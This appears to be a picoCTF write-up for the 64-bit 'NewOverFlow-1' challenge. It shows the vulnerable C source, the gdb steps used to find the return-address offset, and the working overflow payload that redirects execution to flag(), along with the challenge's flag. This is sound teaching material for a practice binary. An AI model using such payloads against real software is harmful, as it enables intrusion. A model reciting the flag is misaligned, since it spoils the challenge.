
# Binary Exploitation - NewOverFlow-1 (200 points)

## Challenge

*Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this [program](./vuln). You can find it in /problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7 on the shell server. [Source](./vuln.c).*

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

## Flag

picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_cfe23f2b}

## Walkthrough

This challenge is based on the same vulnerability than OverFlow 1 : the function void `void vuln()` is vulnerable to a buffer overflow because of a call to `gets()` (no boundaries).

```C
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}
```

First let's get the start address of `void flag()` using gdb:

```bash
root@kali:~/Downloads# gdb ./vuln
[...]
(gdb) info functions
All defined functions:

Non-debugging symbols:
[...]
0x0000000000400767  flag
0x00000000004007cc  vuln
0x00000000004007e8  main
[...]
```

So the return address has to be set to 0x0000000000400767.

Now, time to play a little with GDB to get the size of our overflow:

```bash
root@kali:~/Downloads# gdb ./vuln
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00000000004007cc <+0>:     push   %rbp
   0x00000000004007cd <+1>:     mov    %rsp,%rbp
   0x00000000004007d0 <+4>:     sub    $0x40,%rsp
   0x00000000004007d4 <+8>:     lea    -0x40(%rbp),%rax
   0x00000000004007d8 <+12>:    mov    %rax,%rdi
   0x00000000004007db <+15>:    mov    $0x0,%eax
   0x00000000004007e0 <+20>:    callq  0x400630 <gets@plt>
   0x00000000004007e5 <+25>:    nop
   0x00000000004007e6 <+26>:    leaveq
   0x00000000004007e7 <+27>:    retq
End of assembler dump.
```

We are going to set a breakpoint just after the *gets()* call, and then display the stack content:

```bash
(gdb) break *0x00000000004007e5
Breakpoint 1 at 0x4007e5
(gdb) run <<< $(python -c "print('\x41'*8)")
Starting program: /root/Downloads/vuln <<< $(python -c "print('\x41'*8)")
Welcome to 64-bit. Give me a string that gets you the flag:

Breakpoint 1, 0x00000000004007e5 in vuln ()

(gdb) x/12gx $rsp
0x7fffffffe130: 0x4141414141414141      0x00007ffff7fb5700
0x7fffffffe140: 0x0000000000400928      0x00007ffff7e6f1da
0x7fffffffe150: 0x0000000000000000      0x00007fffffffe1a0
0x7fffffffe160: 0x0000000000400680      0x00007fffffffe280
0x7fffffffe170: 0x00007fffffffe1a0      0x000000000040084a
0x7fffffffe180: 0x00007fffffffe288      0x0000000100400680
```

*buf* starts at 0x7fffffffe130, and our return address is at 0x7fffffffe178 (because at this adress we found the address of the next instruction in *main()* right after *vuln()*). So we have to write (0x7fffffffe178 - 0x7fffffffe130) characters before the return address. Let's try it:

```bash
(gdb) run <<< $(python -c "print('\x41'*72 + '\x67\x07\x40')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Downloads/vuln <<< $(python -c "print('\x41'*72 + '\x67\x07\x40')")
Welcome to 64-bit. Give me a string that gets you the flag:

Breakpoint 1, 0x00000000004007e5 in vuln ()
(gdb) x/12gx $rsp
0x7fffffffe130: 0x4141414141414141      0x4141414141414141
0x7fffffffe140: 0x4141414141414141      0x4141414141414141
0x7fffffffe150: 0x4141414141414141      0x4141414141414141
0x7fffffffe160: 0x4141414141414141      0x4141414141414141
0x7fffffffe170: 0x4141414141414141      0x0000000000400767
0x7fffffffe180: 0x00007fffffffe288      0x0000000100400680
[...]
```

It fits perfectly, and the return address is overwritten. Now in real conditions:

```bash
m3oow@pico-2019-shell1:/problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7$ (python -c "print('A'*72 + '\x68\x07\x40\x00\x00\x00\x00\x00')"; cat -) | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag:
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_cfe23f2b}
```
